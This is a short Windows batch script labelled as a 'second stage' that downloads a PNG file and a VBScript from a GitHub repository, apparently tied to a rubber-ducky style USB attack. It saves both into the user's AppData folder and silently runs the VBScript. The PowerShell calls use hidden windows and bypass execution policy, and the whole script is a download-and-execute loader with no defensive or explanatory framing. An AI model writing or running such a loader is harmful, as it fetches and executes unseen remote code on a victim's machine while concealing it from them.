@echo off
REM =====================================================
REM SECOND STAGE
REM =====================================================

REM Set download paths
set "APPDATA_PATH=%APPDATA%"
set "PNG_FILE=%APPDATA_PATH%\crineson.png"
set "VBS_FILE=%APPDATA_PATH%\yay.vbs"

REM Download crineson.png
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/crineson.png' -OutFile '%PNG_FILE%'"

REM Download yay.vbs
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/yay.vbs' -OutFile '%VBS_FILE%'"

REM Run yay.vbs silently
start "" /wait wscript.exe "%VBS_FILE%"

echo Done.
pause
